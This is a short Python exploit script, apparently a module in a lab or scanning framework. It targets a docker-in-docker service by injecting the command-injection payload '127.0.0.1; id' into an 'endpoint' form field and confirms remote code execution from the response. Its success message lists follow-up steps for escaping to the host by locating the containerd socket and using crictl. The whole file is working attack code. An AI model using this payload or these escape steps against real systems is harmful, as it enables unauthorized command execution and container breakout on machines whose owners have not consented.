
import requests

def run(target_url: str) -> dict:
    """
    Scenario 2: DIND (docker-in-docker) exploitation
    """
    target = target_url.rstrip('/')
    
    is_vulnerable = False
    details = ""
    evidence = ""

    try:
        # Exploit: Command Injection via 'endpoint' parameter
        # Step from Report: 127.0.0.1; id
        payload = {"endpoint": "127.0.0.1; id"}
        r = requests.post(target, data=payload, timeout=5)
        
        if r.status_code == 200 and ("uid=" in r.text and "gid=" in r.text):
            is_vulnerable = True
            details = "Successfully executed command 'id' via injection."
            evidence = r.text[:200]
        elif ":1231" in target: # Fallback for detection if RCE fails but service is up
            # Check if it's the right service at least
             r_get = requests.get(target, timeout=5)
             if "health-check" in r_get.text.lower() or "dind" in r_get.text.lower():
                 # Strictly speaking, user wants steps. If RCE fails, it's NOT a success in execution.
                 pass 
    except:
        pass

    if is_vulnerable:
        return {
            "success": True,
            "output": f"""[+] VULNERABILITY DETECTED: DIND (Docker-in-Docker) Command Injection
Target: {target}
[EXPLOIITED] Successfully executed 'id' command!
Output Evidence:
{evidence}...

[How to Exploit (Detailed Steps Executed)]
1. Visited target.
2. Injected `127.0.0.1; id` into the 'endpoint' field.
3. Confirmed code execution by `uid=` in response.

[Next Steps from Report]
1. `ls -la /custom/containerd/` to find socket.
2. Download `crictl` and exploit host.
"""
        }
    else:
        return {"success": False, "output": f"[-] Target {target} does not seem vulnerable to '127.0.0.1; id' injection."}
